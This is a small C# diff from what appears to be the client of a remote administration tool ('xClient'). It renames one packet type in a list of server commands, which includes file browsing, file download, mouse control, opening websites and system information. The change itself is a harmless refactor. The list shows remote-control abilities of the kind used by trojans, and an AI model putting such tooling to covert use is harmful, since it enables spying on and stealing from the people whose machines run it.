@@ -68,7 +68,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.GetDrives),
                 typeof (Core.Packets.ServerPackets.GetDirectory),
                 typeof (Core.Packets.ServerPackets.DoDownloadFile),
-                typeof (Core.Packets.ServerPackets.DoMouseClick),
+                typeof (Core.Packets.ServerPackets.DoMouseEvent),
                 typeof (Core.Packets.ServerPackets.GetSystemInfo),
                 typeof (Core.Packets.ServerPackets.DoVisitWebsite),
                 typeof (Core.Packets.ServerPackets.DoShowMessageBox),
